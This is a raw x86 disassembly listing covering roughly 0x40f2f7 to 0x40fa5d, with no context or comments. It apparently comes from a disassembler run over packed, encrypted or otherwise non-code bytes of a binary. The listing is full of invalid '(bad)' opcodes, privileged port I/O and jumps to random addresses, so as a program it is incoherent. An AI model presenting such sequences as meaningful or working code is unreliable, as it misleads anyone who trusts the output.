  40f2f7:	and    al,BYTE PTR [ecx]
  40f2f9:	ror    DWORD PTR cs:[ebp-0x1d9aaadd],cl
  40f300:	mov    ch,0x95
  40f302:	(bad)  [ecx+0x1341cae7]
  40f308:	add    BYTE PTR [ecx+0x5e],cl
  40f30b:	xor    BYTE PTR [ebp-0x3e],0xa0
  40f30f:	(bad)  
  40f310:	repz jecxz 0x40f331
  40f313:	repz test eax,0xd0ddbc4b
  40f319:	cld    
  40f31a:	dec    eax
  40f31b:	xchg   edi,eax
  40f31c:	fadd   st,st(3)
  40f31e:	(bad)  
  40f31f:	jge    0x40f39f
  40f321:	icebp  
  40f322:	inc    edx
  40f323:	and    eax,0xcc3e5f0f
  40f328:	pop    ecx
  40f329:	cdq    
  40f32a:	test   bl,al
  40f32c:	mov    al,0x71
  40f32e:	xchg   DWORD PTR [edi+eiz*2+0x27],esp
  40f332:	adc    eax,0x911df7c8
  40f337:	test   al,0xb
  40f339:	push   cs
  40f33a:	pop    ebp
  40f33b:	sbb    BYTE PTR [eax+eiz*1+0x2ba82aab],ch
  40f342:	pop    ebx
  40f343:	jg     0x40f31f
  40f345:	jmp    0x56e51883
  40f34a:	in     al,dx
  40f34b:	add    eax,0xf74f9d8f
  40f350:	pop    edi
  40f351:	add    eax,DWORD PTR [eax+edx*1-0x7f0aba73]
  40f358:	push   edi
  40f359:	rcr    BYTE PTR [ecx],0xf
  40f35c:	fmul   DWORD PTR [esi-0x2d]
  40f35f:	xchg   edx,eax
  40f360:	mov    edi,ebp
  40f362:	cmp    eax,0x8506a354
  40f367:	push   0x2e4c209a
  40f36c:	and    eax,0xdc50f893
  40f371:	push   esp
  40f372:	xchg   DWORD PTR [eax-0x42],eax
  40f375:	dec    eax
  40f376:	mov    eax,ds:0x8ec53f8e
  40f37b:	int    0xe8
  40f37d:	into   
  40f37e:	aaa    
  40f37f:	or     ecx,DWORD PTR [eax-0x3]
  40f382:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f383:	inc    esi
  40f384:	pushf  
  40f385:	or     esi,edx
  40f387:	mov    edi,0xb40ea2d2
  40f38c:	cwde   
  40f38d:	mov    ds:0xd24fcb54,eax
  40f392:	test   eax,0x6570defc
  40f397:	adc    BYTE PTR [edx-0xe],0x14
  40f39b:	jge    0x40f39d
  40f39d:	mov    dh,0xa8
  40f39f:	dec    ebp
  40f3a0:	lea    eax,ds:0xe72229b3
  40f3a6:	shl    DWORD PTR [edi],cl
  40f3a8:	pop    ecx
  40f3a9:	cmp    eax,0x3996998b
  40f3ae:	jle    0x40f34f
  40f3b0:	and    DWORD PTR [ebp+0x49],esi
  40f3b3:	stos   BYTE PTR es:[edi],al
  40f3b4:	jmp    0x40f396
  40f3b6:	pop    ebp
  40f3b7:	add    al,0x9e
  40f3b9:	jecxz  0x40f3fd
  40f3bb:	mov    ah,0x21
  40f3bd:	das    
  40f3be:	pushf  
  40f3bf:	cld    
  40f3c0:	test   eax,0xa74a5fba
  40f3c5:	pop    edi
  40f3c6:	shufps xmm2,XMMWORD PTR ds:0x6b6f1dac,0x55
  40f3ce:	out    dx,al
  40f3cf:	adc    ebp,DWORD PTR [edx-0x9]
  40f3d2:	sbb    dl,bh
  40f3d4:	jecxz  0x40f402
  40f3d6:	out    0x63,eax
  40f3d8:	clc    
  40f3d9:	jb     0x40f3db
  40f3db:	cmp    DWORD PTR [edi-0x60bac1b8],eax
  40f3e1:	sbb    ah,ch
  40f3e3:	ret    
  40f3e4:	rcl    ah,0x7d
  40f3e7:	dec    ebp
  40f3e8:	add    al,0x43
  40f3ea:	and    DWORD PTR [edx+0x66],0x89a7010a
  40f3f1:	outs   dx,BYTE PTR ds:[esi]
  40f3f2:	loop   0x40f376
  40f3f4:	imul   eax,DWORD PTR [eax+0xf315efa],0xdaad9328
  40f3fe:	cld    
  40f3ff:	inc    edi
  40f400:	test   eax,0x9ba864b9
  40f405:	pop    ss
  40f406:	clc    
  40f407:	pop    esi
  40f408:	push   cs
  40f409:	mov    BYTE PTR [ebx-0x68],ah
  40f40c:	mov    WORD PTR [esi],ss
  40f40e:	and    eax,0xbbf109d5
  40f413:	jb     0x40f3d2
  40f415:	mov    ebx,0x1574593e
  40f41a:	push   cs
  40f41b:	sbb    bl,BYTE PTR [edx-0x6f]
  40f41e:	jb     0x40f433
  40f420:	mov    dh,0x4d
  40f422:	sub    al,0xc7
  40f424:	inc    ecx
  40f425:	les    ebx,FWORD PTR [edx+0x7]
  40f428:	xchg   ecx,eax
  40f429:	jo     0x40f3e0
  40f42b:	add    DWORD PTR [edi],ebp
  40f42d:	int    0x66
  40f42f:	xor    eax,0x39baa219
  40f434:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f435:	test   eax,0x74cfdafc
  40f43a:	xor    BYTE PTR [edx+0x32],al
  40f43d:	cld    
  40f43e:	aas    
  40f43f:	mov    cl,0x84
  40f441:	sub    DWORD PTR [eax],edi
  40f443:	xchg   BYTE PTR [edx-0x26],dh
  40f446:	pop    ss
  40f447:	jne    0x40f475
  40f449:	gs mov esp,0x31686dbd
  40f44f:	jl     0x40f453
  40f451:	arpl   di,bp
  40f453:	in     al,dx
  40f454:	mov    ?,WORD PTR [ebx+edx*4]
  40f457:	je     0x40f4a7
  40f459:	js     0x40f49e
  40f45b:	push   DWORD PTR [eax-0x7e]
  40f45e:	sub    dh,ch
  40f460:	sub    dl,BYTE PTR [edx-0x3]
  40f463:	inc    eax
  40f464:	xor    ch,bl
  40f466:	hlt    
  40f467:	scas   al,BYTE PTR es:[edi]
  40f468:	pop    ds
  40f469:	sbb    esi,esp
  40f46b:	out    dx,al
  40f46c:	sub    DWORD PTR [eax-0x6fcb6f74],0xfffffffb
  40f473:	or     ecx,esi
  40f475:	call   0x720c:0x8fea8eb
  40f47c:	mov    ebx,0x36ce6a15
  40f481:	fldcw  WORD PTR [esi]
  40f483:	inc    edx
  40f484:	daa    
  40f485:	push   ss
  40f486:	mov    ?,WORD PTR [edi-0x7b5be6]
  40f48c:	inc    esp
  40f48d:	rol    DWORD PTR [esi-0x35],0x3c
  40f491:	xchg   ecx,eax
  40f492:	mov    ds:0x8b128b96,eax
  40f497:	xor    eax,0x421ce2
  40f49c:	add    DWORD PTR [edx],esi
  40f49e:	mov    esi,DWORD PTR [ebp+0x8]
  40f4a1:	mov    edx,DWORD PTR ds:0x421ce2
  40f4a7:	xor    esi,0x7510893
  40f4ad:	add    esi,0x3272db
  40f4b3:	jmp    0x411847
  40f4b8:	jae    0x40f43a
  40f4ba:	mov    ah,0xa9
  40f4bc:	xchg   ebx,eax
  40f4bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4be:	jecxz  0x40f52c
  40f4c0:	pop    esi
  40f4c1:	sbb    ch,BYTE PTR [ebp-0x65]
  40f4c4:	and    ebp,DWORD PTR [eax]
  40f4c6:	xlat   BYTE PTR ds:[ebx]
  40f4c7:	in     eax,dx
  40f4c8:	dec    ebx
  40f4c9:	lea    esp,[edx+0x62]
  40f4cc:	jmp    0x40f52d
  40f4ce:	bound  esp,QWORD PTR [edx+0x70]
  40f4d1:	mov    cl,0x73
  40f4d3:	inc    ebp
  40f4d4:	(bad)  
  40f4d5:	daa    
  40f4d6:	push   ds
  40f4d7:	into   
  40f4d8:	push   ss
  40f4d9:	mov    ecx,0x7f37f2a0
  40f4de:	ror    cl,0x91
  40f4e1:	into   
  40f4e2:	mov    eax,0x6302e400
  40f4e7:	mov    esp,0x8852e4a1
  40f4ec:	sbb    ebx,ecx
  40f4ee:	jge    0x40f489
  40f4f0:	jmp    0xd20:0xe49a6d68
  40f4f7:	lods   al,BYTE PTR ds:[esi]
  40f4f8:	js     0x40f559
  40f4fa:	push   ds
  40f4fb:	repz xor DWORD PTR cs:[edx+0x1b],esp
  40f500:	mov    cl,0xa9
  40f502:	in     eax,dx
  40f503:	dec    eax
  40f504:	push   esp
  40f505:	in     al,0x0
  40f507:	sbb    DWORD PTR [ebx+esi*2],ebx
  40f50a:	cmp    DWORD PTR [eax-0x1b0e3395],esp
  40f510:	jg     0x40f58d
  40f512:	dec    edx
  40f513:	push   eax
  40f514:	jno    0x40f4c6
  40f516:	cmp    ch,bh
  40f518:	lea    esp,[esi-0x541e5ce6]
  40f51e:	dec    ebx
  40f51f:	fcomip st,st(2)
  40f521:	fs mov edi,0xcba37c6c
  40f527:	stos   BYTE PTR es:[edi],al
  40f528:	bound  esp,QWORD PTR [edx]
  40f52a:	jl     0x40f5a9
  40f52c:	or     ecx,esi
  40f52e:	(bad)  
  40f52f:	jmp    0x40f572
  40f531:	push   ds
  40f532:	sub    ch,BYTE PTR gs:[edi-0x55]
  40f536:	int3   
  40f537:	or     eax,DWORD PTR [esi]
  40f539:	shl    DWORD PTR [ebx],0xb
  40f53c:	xor    esi,DWORD PTR [ebp-0x4]
  40f53f:	mov    dl,BYTE PTR [ebx+0x56]
  40f542:	lds    eax,FWORD PTR [ecx+0x1623086b]
  40f548:	shl    DWORD PTR [eax],1
  40f54a:	inc    edi
  40f54b:	push   esi
  40f54c:	push   es
  40f54d:	ficomp WORD PTR [ebp-0x30653c99]
  40f553:	push   ebx
  40f554:	popa   
  40f555:	nop
  40f556:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f557:	inc    ebx
  40f558:	out    dx,al
  40f559:	or     DWORD PTR [edx+0x37ee13ca],eax
  40f55f:	mov    ebx,0xd73a3cd1
  40f564:	sub    ebx,DWORD PTR [eax]
  40f566:	(bad)  
  40f567:	(bad)  
  40f568:	xor    BYTE PTR [esp+edx*4-0x54],dl
  40f56c:	repz mov ss:0x8f36d59d,eax
  40f573:	ins    BYTE PTR es:[edi],dx
  40f574:	dec    ebx
  40f575:	int3   
  40f576:	mov    ecx,0x12425dc7
  40f57b:	mov    ah,0x10
  40f57d:	jmp    0xcdb0:0x91276daf
  40f584:	or     eax,0x464f2fba
  40f589:	inc    esp
  40f58a:	stc    
  40f58b:	mov    eax,ds:0xf7412c6f
  40f590:	and    eax,0x42402bf6
  40f595:	dec    edi
  40f596:	dec    ecx
  40f597:	inc    eax
  40f598:	pop    ebp
  40f599:	or     al,0xb8
  40f59b:	adc    ebp,DWORD PTR [ebp-0x6e02e741]
  40f5a1:	jp     0x40f61a
  40f5a3:	xchg   BYTE PTR [ecx],bh
  40f5a5:	mov    dl,0xdd
  40f5a7:	xor    ch,al
  40f5a9:	dec    eax
  40f5aa:	mov    edx,DWORD PTR [eax-0x118597fb]
  40f5b0:	(bad)  
  40f5b1:	mov    WORD PTR [ecx+esi*2],ss
  40f5b4:	aaa    
  40f5b5:	cmp    al,0x0
  40f5b7:	mov    dh,BYTE PTR [edx+ebp*1]
  40f5ba:	ds nop
  40f5bc:	enter  0x8ad3,0x4f
  40f5c0:	addr16 sub edx,ebp
  40f5c3:	jl     0x40f5bd
  40f5c5:	cmp    esp,edx
  40f5c7:	daa    
  40f5c8:	cmp    eax,edx
  40f5ca:	aaa    
  40f5cb:	sbb    eax,0x27332f38
  40f5d0:	dec    DWORD PTR [esi+0x46]
  40f5d3:	aad    0x71
  40f5d5:	pop    ebx
  40f5d6:	dec    edi
  40f5d7:	sti    
  40f5d8:	cmp    DWORD PTR [ebx],edx
  40f5da:	imul   DWORD PTR [ebp-0x56fb0059]
  40f5e0:	add    cl,BYTE PTR [eax]
  40f5e2:	lods   eax,DWORD PTR ds:[esi]
  40f5e3:	jp     0x40f5a7
  40f5e5:	push   esi
  40f5e6:	xor    bh,bh
  40f5e8:	in     al,dx
  40f5e9:	(bad)  
  40f5ea:	xor    al,0x3a
  40f5ec:	xor    eax,0x14b51f7
  40f5f1:	xlat   BYTE PTR ds:[ebx]
  40f5f2:	xor    DWORD PTR [ebp-0x482fc42],edx
  40f5f8:	pop    ds
  40f5f9:	push   0x9
  40f5fb:	popa   
  40f5fc:	in     al,0x90
  40f5fe:	pop    edi
  40f5ff:	inc    ecx
  40f600:	out    dx,al
  40f601:	test   al,0x91
  40f603:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f604:	jns    0x40f58d
  40f606:	sbb    eax,DWORD PTR [esi-0x5e]
  40f609:	loop   0x40f591
  40f60b:	cld    
  40f60c:	dec    edi
  40f60d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f60e:	mov    ?,ebp
  40f610:	sbb    al,BYTE PTR [eax+0x2b6b8b1b]
  40f616:	data16 jecxz 0x40f5de
  40f619:	mov    ds:0x725d42c1,al
  40f61e:	mov    ds,ecx
  40f620:	sbb    ah,ch
  40f622:	popf   
  40f623:	pxor   mm0,mm4
  40f626:	aas    
  40f627:	(bad)  
  40f628:	jmp    0x7de1:0xe1bddf2c
  40f62f:	and    BYTE PTR [edx+0x708a1486],cl
  40f635:	aam    0x20
  40f637:	pusha  
  40f638:	and    al,0x69
  40f63a:	ret    
  40f63b:	inc    esp
  40f63c:	fcom   st(1)
  40f63e:	in     eax,dx
  40f63f:	arpl   WORD PTR [ebx-0xd],dx
  40f642:	mov    esi,0x35704af7
  40f647:	repz bound esi,QWORD PTR [edi]
  40f64a:	fnstsw WORD PTR [esi+0x1f]
  40f64d:	div    DWORD PTR [ebp-0x6aac1076]
  40f653:	jmp    0x40f68f
  40f655:	nop
  40f656:	cmp    DWORD PTR [edi],ebp
  40f658:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f659:	jnp    0x40f637
  40f65b:	in     eax,dx
  40f65c:	xchg   esi,eax
  40f65d:	mov    edx,0xf4152235
  40f662:	call   0xd92efed1
  40f667:	adc    ecx,edi
  40f669:	or     eax,0xa9b15c24
  40f66e:	sub    BYTE PTR [esi],bh
  40f670:	ficomp WORD PTR [esi]
  40f672:	fcmove st,st(1)
  40f674:	sub    ebx,edx
  40f676:	cmp    edi,DWORD PTR [ecx]
  40f678:	pop    edi
  40f679:	pop    ebx
  40f67a:	jp     0x40f6f0
  40f67c:	sub    ebp,DWORD PTR [ebx-0x6a]
  40f67f:	test   BYTE PTR [ecx-0x48efb472],ch
  40f685:	xchg   ebp,eax
  40f686:	push   eax
  40f687:	pop    eax
  40f688:	sbb    eax,0xcd03c9a6
  40f68d:	xor    ah,ah
  40f68f:	dec    edi
  40f690:	push   ss
  40f691:	and    dh,BYTE PTR [edi+0x2b]
  40f694:	mov    DWORD PTR [ebx],ebp
  40f696:	bound  edx,QWORD PTR [ebx]
  40f698:	mov    bl,0xc
  40f69a:	xor    DWORD PTR [ebx],ecx
  40f69c:	add    ch,BYTE PTR ds:0xb53a20c8
  40f6a2:	retf   
  40f6a3:	xor    al,0xfb
  40f6a5:	imul   ebp,DWORD PTR [ebx],0x6f0c48c
  40f6ab:	bound  ebx,QWORD PTR [eax]
  40f6ad:	pop    edx
  40f6ae:	retf   0x8c01
  40f6b1:	das    
  40f6b2:	xchg   ecx,eax
  40f6b3:	jp     0x40f659
  40f6b5:	sub    bl,BYTE PTR [ebp+ecx*8+0x14da1d38]
  40f6bc:	in     eax,0x0
  40f6be:	aam    0x84
  40f6c0:	cmp    DWORD PTR [ecx],esi
  40f6c2:	push   ecx
  40f6c3:	adc    DWORD PTR [ebx],esp
  40f6c5:	loope  0x40f667
  40f6c7:	nop
  40f6c8:	xor    BYTE PTR [ebp-0xa],dh
  40f6cb:	xor    ecx,esp
  40f6cd:	cwde   
  40f6ce:	push   ecx
  40f6cf:	mov    al,0xa0
  40f6d1:	or     dh,BYTE PTR [edx-0x54494727]
  40f6d7:	xchg   ecx,eax
  40f6d8:	ret    
  40f6d9:	mov    DWORD PTR [esp+esi*8],esp
  40f6dc:	sbb    edi,DWORD PTR [eax+0x6e2d5fcc]
  40f6e2:	sbb    al,0x69
  40f6e4:	xor    ch,dh
  40f6e6:	add    eax,0x4cbf46f
  40f6eb:	out    0xf8,eax
  40f6ed:	and    esp,DWORD PTR [edx]
  40f6ef:	ret    0xf400
  40f6f2:	inc    eax
  40f6f3:	scas   al,BYTE PTR es:[edi]
  40f6f4:	mov    esi,0xf0ca91c
  40f6f9:	pusha  
  40f6fa:	ficom  WORD PTR [eax-0x27b5f366]
  40f700:	out    dx,eax
  40f701:	packssdw mm1,QWORD PTR [ebp-0x36feca1]
  40f708:	data16 sbb dh,0x9f
  40f70c:	aam    0xb7
  40f70e:	aam    0x23
  40f710:	jne    0x40f717
  40f712:	lock adc cl,dl
  40f715:	jae    0x40f6a3
  40f717:	inc    edx
  40f718:	add    ebp,DWORD PTR [edi-0x134c3033]
  40f71e:	stos   BYTE PTR es:[edi],al
  40f71f:	aam    0xba
  40f721:	aam    0x15
  40f723:	xor    BYTE PTR [edx],al
  40f725:	push   esp
  40f726:	or     al,0x50
  40f728:	xor    BYTE PTR [edi-0x1c07a7cf],dl
  40f72e:	idiv   BYTE PTR [ebx-0x67]
  40f731:	mov    dl,0xd3
  40f733:	sub    DWORD PTR [edi-0x37],edi
  40f736:	fsubr  DWORD PTR [ebp-0x27d901b]
  40f73c:	push   ecx
  40f73d:	xchg   ebp,eax
  40f73e:	mov    ch,0xf9
  40f740:	out    dx,al
  40f741:	xchg   esp,eax
  40f742:	pushf  
  40f743:	pop    esi
  40f744:	sub    eax,DWORD PTR ds:0xacf75d7e
  40f74a:	mov    esi,eax
  40f74c:	adc    ecx,edi
  40f74e:	add    eax,0x21a20449
  40f753:	adc    al,0x2e
  40f755:	xchg   DWORD PTR [ebx],esp
  40f757:	sbb    dh,BYTE PTR [esi]
  40f759:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f75a:	mov    edx,0xe2b2ef5
  40f75f:	xchg   ecx,eax
  40f760:	xchg   esi,eax
  40f761:	add    BYTE PTR [ebx+0x9],ah
  40f764:	sahf   
  40f765:	xchg   edx,eax
  40f766:	cs push ecx
  40f768:	(bad)  
  40f76a:	nop
  40f76b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f76c:	pusha  
  40f76d:	sub    eax,0x34894761
  40f772:	jne    0x40f7d8
  40f774:	scas   eax,DWORD PTR es:[edi]
  40f775:	cdq    
  40f776:	loope  0x40f70d
  40f778:	mov    esp,0x53028ba3
  40f77d:	jmp    esp
  40f77f:	(bad)  
  40f780:	fidivr DWORD PTR [eax-0x595cd0e1]
  40f786:	jo     0x40f7b9
  40f788:	and    al,0x49
  40f78a:	pop    es
  40f78b:	out    0x3f,eax
  40f78d:	clc    
  40f78e:	and    eax,0x51f3d979
  40f793:	fcom   st(7)
  40f795:	mov    al,ds:0x37cf8926
  40f79a:	jo     0x40f7a8
  40f79c:	js     0x40f7b1
  40f79e:	leave  
  40f79f:	iret   
  40f7a0:	inc    ebp
  40f7a1:	loopne 0x40f754
  40f7a3:	mov    dh,0xbb
  40f7a5:	pop    bp
  40f7a7:	repz call 0x39287d0d
  40f7ad:	(bad)  
  40f7ae:	sub    edi,DWORD PTR [ebp+eiz*1+0x19aa7475]
  40f7b5:	sub    eax,DWORD PTR [ecx+0x1b]
  40f7b8:	lods   eax,DWORD PTR ds:[esi]
  40f7b9:	jle    0x40f7c5
  40f7bb:	sub    eax,0xee482873
  40f7c0:	test   DWORD PTR [ecx+eax*8-0x5c85576d],edx
  40f7c7:	adc    BYTE PTR [eax+0x6249fe05],0x51
  40f7ce:	neg    DWORD PTR [ebx]
  40f7d0:	outs   dx,BYTE PTR ds:[esi]
  40f7d1:	scas   eax,DWORD PTR es:[edi]
  40f7d2:	sub    eax,0xd6b59588
  40f7d7:	je     0x40f83a
  40f7d9:	icebp  
  40f7da:	and    esp,DWORD PTR [edi]
  40f7dc:	adc    BYTE PTR [eax+0x74513d8a],cl
  40f7e2:	pop    edi
  40f7e3:	push   es
  40f7e4:	pop    ss
  40f7e5:	dec    esp
  40f7e6:	xor    DWORD PTR [edx+0x6e],ebp
  40f7e9:	jne    0x40f7a6
  40f7eb:	xor    eax,0xf46c5890
  40f7f0:	xchg   esi,eax
  40f7f1:	push   ebp
  40f7f2:	or     al,0xab
  40f7f4:	sbb    al,0xbe
  40f7f6:	(bad)  
  40f7f7:	sub    eax,0xfae60f3d
  40f7fc:	inc    esp
  40f7fd:	adc    al,0xc3
  40f7ff:	pop    ss
  40f800:	cmp    BYTE PTR [eax+0x4d],0x79
  40f804:	sbb    eax,0x5d44f3f3
  40f809:	int3   
  40f80a:	mov    dl,BYTE PTR [ebx+0x409c300f]
  40f810:	out    dx,al
  40f811:	jg     0x40f7ef
  40f813:	popa   
  40f814:	sahf   
  40f815:	div    DWORD PTR [edx+edi*8+0x50]
  40f819:	pop    dx
  40f81b:	sbb    bh,BYTE PTR ds:0x35d41634
  40f821:	sti    
  40f822:	mov    ds,WORD PTR [esi]
  40f824:	mov    ebx,0x4207a12f
  40f829:	leave  
  40f82a:	xchg   dl,ch
  40f82c:	xor    al,0x9c
  40f82e:	repnz sti 
  40f830:	call   0xe32fa237
  40f835:	push   es
  40f836:	sahf   
  40f837:	inc    ecx
  40f838:	jne    0x40f878
  40f83a:	shr    BYTE PTR [edi+0x1e],1
  40f83d:	xor    al,0x79
  40f83f:	inc    edi
  40f840:	mov    edx,0x975cee18
  40f845:	add    ebx,DWORD PTR [esi+eiz*4]
  40f848:	xchg   ebp,eax
  40f849:	imul   ecx,DWORD PTR [ecx],0x167448b1
  40f84f:	shl    BYTE PTR [ebx+0x3b1e13f8],0xd3
  40f856:	inc    eax
  40f857:	sub    dl,BYTE PTR [ebp+0x15]
  40f85a:	setnp  BYTE PTR [ebx]
  40f85d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f85e:	in     eax,dx
  40f85f:	call   0xbb037622
  40f864:	mov    ds:0xd8dea80,eax
  40f869:	std    
  40f86a:	mov    al,ds:0x54564c4
  40f86f:	(bad)  
  40f870:	lock inc ebp
  40f872:	aaa    
  40f873:	call   0x409:0xeb7634bb
  40f87a:	loopne 0x40f8a3
  40f87c:	xor    cl,dl
  40f87e:	sub    BYTE PTR [eax],dh
  40f880:	or     eax,0xaa65a8d0
  40f885:	jne    0x40f841
  40f887:	dec    eax
  40f888:	rol    BYTE PTR [ecx-0x4898fc5c],1
  40f88e:	test   al,0x64
  40f890:	cmp    al,bh
  40f892:	jmp    0x40f84f
  40f894:	inc    esp
  40f895:	mov    edi,0x9bda9bc1
  40f89a:	lods   eax,DWORD PTR ds:[esi]
  40f89b:	push   edx
  40f89c:	cmc    
  40f89d:	or     eax,0xe04a1cc3
  40f8a2:	dec    edi
  40f8a3:	inc    ebx
  40f8a4:	dec    esi
  40f8a5:	lea    edx,es:[edx+0x13]
  40f8a9:	outs   dx,BYTE PTR ds:[esi]
  40f8aa:	ja     0x40f8d9
  40f8ac:	dec    ebp
  40f8ad:	sahf   
  40f8ae:	test   al,0xba
  40f8b0:	outs   dx,DWORD PTR ds:[esi]
  40f8b1:	into   
  40f8b2:	aaa    
  40f8b3:	jbe    0x40f89b
  40f8b5:	scas   eax,DWORD PTR es:[edi]
  40f8b6:	outs   dx,DWORD PTR ds:[esi]
  40f8b7:	adc    edi,esp
  40f8b9:	mov    ds:0x278573b0,al
  40f8be:	test   al,0x31
  40f8c0:	or     ebp,edx
  40f8c2:	pusha  
  40f8c3:	(bad)  
  40f8c4:	jbe    0x40f8d7
  40f8c6:	xchg   esp,esp
  40f8c8:	je     0x40f87d
  40f8ca:	dec    esi
  40f8cb:	mul    eax
  40f8cd:	nop
  40f8ce:	ja     0x40f8f3
  40f8d0:	jge    0x40f86f
  40f8d2:	lds    ebp,FWORD PTR [edi+ebp*8]
  40f8d5:	xor    ah,BYTE PTR [edx]
  40f8d7:	mov    ebx,0xb6381405
  40f8dc:	outs   dx,BYTE PTR ds:[esi]
  40f8dd:	jg     0x40f945
  40f8df:	js     0x40f86a
  40f8e1:	(bad)  
  40f8e2:	sub    al,0xb7
  40f8e4:	std    
  40f8e5:	dec    eax
  40f8e6:	pop    eax
  40f8e7:	rcl    DWORD PTR [eax+eax*1-0x78214af9],0xe
  40f8ef:	fsub   DWORD PTR [ecx]
  40f8f1:	xchg   esi,eax
  40f8f2:	inc    ebx
  40f8f3:	mov    fs:0x157ba299,eax
  40f8f9:	scas   al,BYTE PTR es:[edi]
  40f8fa:	add    esi,eax
  40f8fc:	push   ebp
  40f8fd:	outs   dx,BYTE PTR ds:[esi]
  40f8fe:	clc    
  40f8ff:	pinsrw mm5,WORD PTR [edx],0x27
  40f903:	sbb    dh,BYTE PTR [ecx]
  40f905:	cmp    BYTE PTR [edi+0x26],bh
  40f908:	xlat   BYTE PTR ds:[ebx]
  40f909:	(bad)
  40f90d:	outs   dx,DWORD PTR ds:[esi]
  40f90e:	ins    BYTE PTR es:[edi],dx
  40f90f:	je     0x40f950
  40f911:	jmp    0xd3ff47d7
  40f916:	test   al,0xce
  40f918:	or     cl,BYTE PTR [esi-0x2b190843]
  40f91e:	mov    eax,0x632c3591
  40f923:	jbe    0x40f8c7
  40f925:	add    ecx,DWORD PTR [eax]
  40f927:	shl    al,0x55
  40f92a:	shl    esi,0x31
  40f92d:	pop    ebx
  40f92e:	test   al,dh
  40f930:	add    al,0x3d
  40f932:	or     BYTE PTR [edi+0x24330362],al
  40f938:	dec    eax
  40f939:	loopne 0x40f925
  40f93b:	popa   
  40f93c:	dec    ecx
  40f93d:	mov    cl,0xe
  40f93f:	pop    ss
  40f940:	jl     0x40f8ed
  40f942:	mov    bl,0x36
  40f944:	and    al,0x87
  40f946:	cmp    DWORD PTR [eax],0x57
  40f949:	and    DWORD PTR [edi],edx
  40f94b:	or     edx,esi
  40f94d:	fsubr  QWORD PTR [edi+0x5d4a10e]
  40f953:	push   esp
  40f954:	loopne 0x40f8df
  40f956:	xor    al,0xc1
  40f958:	inc    eax
  40f959:	cmovno ecx,DWORD PTR [eax+ebp*8]
  40f95d:	paddw  mm5,QWORD PTR [esp+edx*1+0x4a76ff7d]
  40f965:	cmp    bl,BYTE PTR [edi]
  40f967:	xor    edi,DWORD PTR [ebp+0x73d74ddd]
  40f96d:	mov    ch,0x84
  40f96f:	jo     0x40f910
  40f971:	addr16 (bad) 
  40f973:	mov    ds:0xd5fda9f3,al
  40f978:	jno    0x40f917
  40f97a:	add    BYTE PTR [ecx+0x7e],ch
  40f97d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f97e:	adc    al,BYTE PTR [ecx]
  40f980:	or     DWORD PTR [edi],edi
  40f982:	shl    BYTE PTR [edi-0x59],0x67
  40f986:	sbb    DWORD PTR [edx-0x76bdee23],ecx
  40f98c:	or     DWORD PTR [edi+edi*8],0x6e
  40f990:	mov    esp,0xe47e15e1
  40f995:	dec    ebp
  40f996:	jns    0x40f9f6
  40f998:	out    0xf6,eax
  40f99a:	fisttp QWORD PTR [esi-0x26]
  40f99d:	les    ecx,FWORD PTR [eax+0x59ddf7de]
  40f9a3:	in     eax,0xf0
  40f9a5:	arpl   WORD PTR [ebp-0x647bb94d],ax
  40f9ab:	movnti DWORD PTR [ebx],edi
  40f9ae:	mov    al,0x2d
  40f9b0:	repnz xchg esi,eax
  40f9b2:	icebp  
  40f9b3:	stc    
  40f9b4:	jl     0x40f9a2
  40f9b6:	xor    BYTE PTR [esp+eiz*8-0x67],bh
  40f9ba:	sbb    dl,BYTE PTR [eax]
  40f9bc:	aaa    
  40f9bd:	add    bh,BYTE PTR [ecx]
  40f9bf:	push   eax
  40f9c0:	pusha  
  40f9c1:	pushf  
  40f9c2:	jne    0x40f9e7
  40f9c4:	mov    ebx,0xc09833dd
  40f9c9:	aad    0xf7
  40f9cb:	mov    ch,0x34
  40f9cd:	imul   ebp,DWORD PTR ds:0xc403cbe8,0x3370acee
  40f9d7:	fstp   TBYTE PTR [edi+ebx*1-0x3c7a2cd6]
  40f9de:	inc    esi
  40f9df:	les    ecx,FWORD PTR [ebx]
  40f9e1:	das    
  40f9e2:	xor    ch,bh
  40f9e4:	repz test eax,0x35601e2c
  40f9ea:	sbb    DWORD PTR [ebx],ebp
  40f9ec:	push   ds
  40f9ed:	lock pop edx
  40f9ef:	sbb    BYTE PTR [esi-0x38],bh
  40f9f2:	xor    dh,BYTE PTR [edi+0x57511c36]
  40f9f8:	call   0x47af:0x5aa6d1c1
  40f9ff:	addr16 das 
  40fa01:	sti    
  40fa02:	pop    ebp
  40fa03:	or     bl,dh
  40fa05:	aad    0xc4
  40fa07:	ror    BYTE PTR [edx],1
  40fa09:	test   BYTE PTR [esi+ebp*8-0x37],bh
  40fa0d:	mov    edx,0x3c7f3b75
  40fa12:	push   esp
  40fa13:	leave  
  40fa14:	ss and al,0x73
  40fa17:	(bad)  
  40fa18:	or     eax,0x5efef75f
  40fa1d:	adc    eax,0x2b0b0080
  40fa22:	rcl    al,1
  40fa24:	bound  edi,QWORD PTR [eax-0x64daa7e2]
  40fa2a:	cmp    bh,dl
  40fa2c:	lods   eax,DWORD PTR ds:[esi]
  40fa2d:	loop   0x40f9b2
  40fa2f:	inc    esi
  40fa30:	xchg   edi,eax
  40fa31:	cwde   
  40fa32:	add    DWORD PTR [edx-0x4],ecx
  40fa35:	push   ds
  40fa36:	xor    esp,ebp
  40fa38:	cmp    al,0xdc
  40fa3a:	push   esi
  40fa3b:	xor    al,0x94
  40fa3d:	ret    0x60ba
  40fa40:	int3   
  40fa41:	xchg   ebx,eax
  40fa42:	jnp    0x40fa1b
  40fa44:	lods   al,BYTE PTR ds:[esi]
  40fa45:	data16 out 0x40,al
  40fa48:	inc    edi
  40fa49:	pop    eax
  40fa4a:	sbb    DWORD PTR [ecx-0x1c],ebp
  40fa4d:	mov    ebx,0x5da48919
  40fa52:	xor    eax,0x402427a6
  40fa57:	aas    
  40fa58:	xchg   ebx,eax
  40fa59:	gs mov cl,0x5e
  40fa5c:	push   ds
  40fa5d:	push   esi
